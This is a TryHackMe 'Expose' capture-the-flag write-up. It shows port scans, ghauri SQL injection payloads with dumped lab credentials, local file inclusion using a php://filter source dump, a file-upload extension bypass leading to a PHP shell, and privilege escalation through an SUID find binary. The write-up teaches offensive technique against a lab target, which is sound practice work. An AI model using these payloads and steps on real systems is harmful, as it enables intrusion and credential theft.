-----------------

### CTF: TRYHACKME
### LAB: Expose

------------------

![image](https://github.com/user-attachments/assets/1f904084-8c3c-4b2d-9d78-59b279eaa519)

------------------

- Rustscan's output

```bash
❯ rustscan -a 10.10.140.248 -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.140.248:21
Open 10.10.140.248:22
Open 10.10.140.248:53
Open 10.10.140.248:1883
Open 10.10.140.248:1337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 12:03 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:03
Completed NSE at 12:03, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:03
Completed Parallel DNS resolution of 1 host. at 12:03, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:03
Scanning 10.10.140.248 [5 ports]
Discovered open port 21/tcp on 10.10.140.248
Discovered open port 22/tcp on 10.10.140.248
Discovered open port 53/tcp on 10.10.140.248
Discovered open port 1883/tcp on 10.10.140.248
Discovered open port 1337/tcp on 10.10.140.248
Completed Connect Scan at 12:03, 0.41s elapsed (5 total ports)
Initiating Service scan at 12:03
Scanning 5 services on 10.10.140.248
Completed Service scan at 12:04, 11.73s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.140.248.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:04
NSE: [ftp-bounce 10.10.140.248:21] PORT response: 500 Illegal PORT command.
Completed NSE at 12:04, 10.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 1.60s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Nmap scan report for 10.10.140.248
Host is up, received user-set (0.41s latency).
Scanned at 2024-11-27 12:03:52 WAT for 24s

PORT     STATE SERVICE                 REASON  VERSION
21/tcp   open  ftp                     syn-ack vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.45.35
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ae:da:97:e5:c7:fe:6b:d1:e3:35:51:5f:ad:ad:89:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsKB7ppF6NLFhtNRx7WC05tbwUkmPIKizAKBv5qxzQfiwSAwX/Cxpamkndb+azMxc8tQ7AFz/PedMdxRwjrBy8Rabwz010UZDXLmvCoDzUYcUQY9SiXRxQD0MLR+U9tts77f+HXIqm4n+FziGezS04LwjB76Bv0tB4ilVBi1u1yOCDHWkxzFCvCYb+ygvP4hLSpoWlEj53wJfk3hB7oYUX5PmGX4o2CrFgfOUKIql71Ch8qQptCA7wqb8tlcd38K2meH2XJszRcdAInCJl7t1BMVMhEf39brjFJsj6iZ1FEU7jn+L/RS9xb0xn680D/upoS7cEgtlWEqV6sqGiEXWAYCA4wlJwfyW8df4XvBhFuSW3D9Ndzm8K09EjqaWNUGhWufZwiQs8zwqBlESL+Pm9VGCkHt35kDAPjM6z5Hu9jdgnyMRCYmYoLq/vqUVqN2DRQaDVB2A4EaBhAYyFdK0JdWVek6rZUx8RmgH94sYFdvs2NkDA3UFliE6uCEAW1ak=
|   256 85:95:e6:c0:74:ab:de:2c:92:27:24:12:3b:96:c9:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC0m93ykBdid8g9Hmr0kaxLEkQlSgu3bgKe5+LhYws+wrluiqZ0oWY4GlClUYTk+zsvQxH9CF38WUmr0WSrmJ5g=
|   256 8f:4e:03:3c:ef:a7:8b:a0:65:54:b4:f6:a3:8c:af:0a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIClOMU/FU+0ss9IC79LV64VwUp521fQu/PsFmb1fhqIz
53/tcp   open  domain                  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: EXPOSED
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1883/tcp open  mosquitto version 1.6.9 syn-ack
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/bytes/sent: 4
|     $SYS/broker/load/bytes/received/5min: 3.53
|     $SYS/broker/load/connections/1min: 0.91
|     $SYS/broker/load/bytes/sent/1min: 3.65
|     $SYS/broker/bytes/received: 18
|     $SYS/broker/messages/sent: 1
|     $SYS/broker/load/messages/sent/5min: 0.20
|     $SYS/broker/load/connections/15min: 0.07
|     $SYS/broker/load/connections/5min: 0.20
|     $SYS/broker/load/messages/sent/1min: 0.91
|     $SYS/broker/load/messages/sent/15min: 0.07
|     $SYS/broker/messages/received: 1
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/load/bytes/received/15min: 1.19
|     $SYS/broker/uptime: 143 seconds
|     $SYS/broker/store/messages/bytes: 179
|     $SYS/broker/load/bytes/sent/15min: 0.27
|     $SYS/broker/load/sockets/5min: 0.56
|     $SYS/broker/load/sockets/1min: 2.19
|     $SYS/broker/load/sockets/15min: 0.19
|     $SYS/broker/load/bytes/sent/5min: 0.79
|     $SYS/broker/load/messages/received/15min: 0.07
|     $SYS/broker/load/bytes/received/1min: 16.45
|     $SYS/broker/heap/maximum: 49688
|     $SYS/broker/load/messages/received/1min: 0.91
|_    $SYS/broker/load/messages/received/5min: 0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Ffuf's output for http serve ron port `1337`

![image](https://github.com/user-attachments/assets/e957d657-2132-490f-8077-330ce70b8af1)

- The admin page in directory `admin_101` hosts a login page with the username value `hacker@root.thm`.

![image](https://github.com/user-attachments/assets/8166b15b-e817-4c66-a3e3-b228203c61cf)

- I tried the basic sql injection payload `<username>'--` and got an `undefined` alert.

![image](https://github.com/user-attachments/assets/1b2fbdf1-7066-430b-beb8-3e2107e35a7b)

- Then, I tested for sql injection with the `ghauri` tool and was able to dump the data.

```
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n

Ghauri identified the following injection point(s) with a total of 54 HTTP(s) requests:
---                                                                                                                                                 
Parameter: email (POST)                                                                                                                             
    Type: error-based                                                                                                                               
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)                                                  
    Payload: email=' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW&password=' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW                                                                     
                                                                                                                                                    
    Type: time-based blind                                                                                                                          
    Title: MySQL >= 5.0.12 time-based blind (IF - comment)                                                                                          
    Payload: email='XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z&password='XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z                                     
                                                                                                                                                    
Parameter: password (POST)                                                                                                                          
    Type: error-based                                                                                                                               
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)                                                  
    Payload: email=' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW&password=' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW                                                                     
                                                                                                                                                    
    Type: time-based blind                                                                                                                          
    Title: MySQL >= 5.0.12 time-based blind (IF - comment)                                                                                          
    Payload: email='XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z&password='XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z                                     
---                                                                                                                                                 
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: email  (default)                                                                                                        
[1] place: POST, parameter: password                                                                                                                
[q] Quit                                                                                                                                            
> 0                                                                                                                                                 

[19:38:58] [INFO] testing MySQL
[19:38:58] [INFO] confirming MySQL
[19:38:58] [INFO] the back-end DBMS is MySQL
[19:38:58] [WARNING] missing database parameter. Ghauri is going to use the current database to enumerate table(s) entries
[19:38:58] [INFO] fetching current database
[19:38:59] [INFO] retrieved: 'expose'
current database: 'expose'
[19:38:59] [INFO] fetching tables for database: expose
[19:38:59] [INFO] fetching number of tables for database 'expose'
[19:39:00] [INFO] retrieved: 2
[19:39:02] [INFO] retrieved: config
[19:39:02] [INFO] retrieved: user
Database: expose
[2 tables]
+--------+
| user   |                                                                                                                                          
| config |                                                                                                                                          
+--------+                                                                                                                                          
[19:39:02] [INFO] fetching columns for table 'user' in database 'expose'
[19:39:02] [INFO] fetching number of columns for table 'user' in database 'expose'
[19:39:07] [INFO] retrieved: 4
[19:39:08] [INFO] retrieved: created
[19:39:08] [INFO] retrieved: email
[19:39:09] [INFO] retrieved: id
[19:39:09] [INFO] retrieved: password
Database: expose
Table: user
[4 columns]
+----------+
| created  |                                                                                                                                        
| email    |                                                                                                                                        
| id       |                                                                                                                                        
| password |                                                                                                                                        
+----------+                                                                                                                                        
[19:39:09] [INFO] fetching entries of column(s) 'created,email,id,password' for table 'user' in database 'expose'
[19:39:09] [INFO] fetching number of column(s) 'created,email,id,password' entries for table 'user' in database 'expose'
[19:39:10] [INFO] retrieved: 1
[19:39:11] [INFO] retrieved: 2023-02-21 09:05:46
[19:39:11] [INFO] retrieved: hacker@root.thm
[19:39:12] [INFO] retrieved: 1
[19:39:12] [INFO] retrieved: VeryDifficultPassword!!#@#@!#!@#1231
Database: expose
Table: user
[1 entries]
+---------------------+-----------------+----+--------------------------------------+
| created             | email           | id | password                             |                                                               
+---------------------+-----------------+----+--------------------------------------+                                                               
| 2023-02-21 09:05:46 | hacker@root.thm | 1  | VeryDifficultPassword!!#@#@!#!@#1231 |                                                               
+---------------------+-----------------+----+--------------------------------------+                                                               
[19:39:12] [INFO] table 'expose.user' dumped to CSV file '/home/sensei/.ghauri/10.10.125.91/dump/expose/user.csv'
[19:39:12] [INFO] fetching columns for table 'config' in database 'expose'
[19:39:12] [INFO] fetching number of columns for table 'config' in database 'expose'
[19:39:13] [INFO] retrieved: 3
[19:39:14] [INFO] retrieved: id
[19:39:14] [INFO] retrieved: password
[19:39:15] [INFO] retrieved: url
Database: expose
Table: config
[3 columns]
+----------+
| id       |                                                                                                                                        
| password |                                                                                                                                        
| url      |                                                                                                                                        
+----------+                                                                                                                                        
[19:39:15] [INFO] fetching entries of column(s) 'id,password,url' for table 'config' in database 'expose'
[19:39:15] [INFO] fetching number of column(s) 'id,password,url' entries for table 'config' in database 'expose'
[19:39:15] [INFO] retrieved: 2
[19:39:16] [INFO] retrieved: 1
[19:39:17] [INFO] retrieved: 69c66901194a6486176e81f5945b8929
[19:39:17] [INFO] retrieved: /file1010111/index.php
[19:39:17] [INFO] retrieved: 3
[19:39:18] [INFO] retrieved: // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z
[19:39:25] [INFO] retrieved: /upload-cv00101011/index.php
Database: expose
Table: config
[2 entries]
+----+-----------------------------------------------------+------------------------------+
| id | password                                            | url                          |                                                         
+----+-----------------------------------------------------+------------------------------+                                                         
| 1  | 69c66901194a6486176e81f5945b8929                    | /file1010111/index.php       |                                                         
| 3  | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z | /upload-cv00101011/index.php |                                                         
+----+-----------------------------------------------------+------------------------------+                                                         
[19:39:25] [INFO] table 'expose.config' dumped to CSV file '/home/sensei/.ghauri/10.10.125.91/dump/expose/config.csv'

[19:39:25] [INFO] fetched data logged to text files under '/home/sensei/.ghauri/10.10.125.91'

[*] ending @ 19:39:25 /2024-11-27/                                                                                                                  

```

- Important highlights are detailed in the pictures.The first pictures shows the password for the username which we don't need because it is a rabbit hole while the second picture shows urls and a password hash.

![image](https://github.com/user-attachments/assets/3fac3837-06e3-4cba-8fc9-bffca9181192)

![image](https://github.com/user-attachments/assets/50ce29f1-e1f1-4944-b7fc-70e3c3d63975)

- I cracked the password hash with [crackstation](crackstation.net)

![image](https://github.com/user-attachments/assets/3a662154-6c90-47df-9b7f-e4dc465eeadd)

- The first url takes us to an admin panel and the cracked hash works for us.

![image](https://github.com/user-attachments/assets/cdd7deb3-a08a-4f81-bef5-28d9d7496801)

- I checked the password source and noticed a dev comment to use `file` and `view` as get parameters.

![image](https://github.com/user-attachments/assets/e8756f2c-3170-4a94-b5c1-0617a43d678d)

- The parameter `file` is vulnerable to `Local File Include`.I was able to read the `/etc/passwd` file

![image](https://github.com/user-attachments/assets/a3c1106d-80fa-4ed0-968c-ca01432d5835)

- After that discovery, I visited the other page which requires a username starting with `z`.

![image](https://github.com/user-attachments/assets/b9aea4d4-db61-44d4-ad87-05855bf6af07)

- Instead of bruteforcing,I dumped the content of that page in base64 using the `php://filter/convert.base64-encode/resource=` filter to see the source code.

![image](https://github.com/user-attachments/assets/80f52c4c-6f46-4969-a780-6d2506cb0f06)

- After checking the code,the username is `zeamkish`.

```php
 if ($password === 'zeamkish' AND !isset($_SESSION['validate_file'])){
                $_SESSION['validate_file'] = true;
```

- In the source code, I noticed there is a filter for file uploaded to the server.

```php
function validate(){

 var fileInput = document.getElementById('file');
  var file = fileInput.files[0];
  
  if (file) {
    var fileName = file.name;
    var fileExtension = fileName.split('.').pop().toLowerCase();
    
    if (fileExtension === 'jpg' || fileExtension === 'png') {
      // Valid file extension, proceed with file upload
      // You can submit the form or perform further processing here
      console.log('File uploaded successfully');
          return true;
    } else {
      // Invalid file extension, display an error message or take appropriate action
      console.log('Only JPG and PNG files are allowed');
          return false;
    }
  }
}
```

- The main sink is the `fileExtension` variable.The variable splits the string with delimeter `.` and deletes the last element of the array with `pop()`.It only picks the characters after the first dot.We can bypass this by simply naming our file `.jpg.php.

```php
var fileExtension = fileName.split('.').pop().toLowerCase();
```

- File upload bypassed

![image](https://github.com/user-attachments/assets/a5ffb5de-0995-4eac-b100-69a928c35064)

- I used the post parameter for the shell page because somehow the dev restricted the apache's server url which affects only the gat parameter.RCE achieved

![image](https://github.com/user-attachments/assets/6d79dbaa-76f4-43d7-bbb3-b9af41532f5e)

- Shell access-:

 ![image](https://github.com/user-attachments/assets/2948113c-408f-4a94-8b77-c694b34f6c63)

 ### PRIVESC with suid `find`

 - I found ssh creds for a user `zeamkish` and gained access to the account.

 ![image](https://github.com/user-attachments/assets/57c1dd3b-1cc0-418d-b550-eebe08d8faeb)

 - I checked for suid binaries with `find / -perm -u=s -type f 2</dev/null` and discovered binary `find` with suid permissions

 ![image](https://github.com/user-attachments/assets/5fafc065-1f75-470f-b1b8-8ab1b0bd5e46)

 - Root-:

 ![image](https://github.com/user-attachments/assets/220e498c-b389-42c9-a9b5-d7eb9c270c9b)


------------------

 ### THANKS FOR READING.......!!!

-----------------



















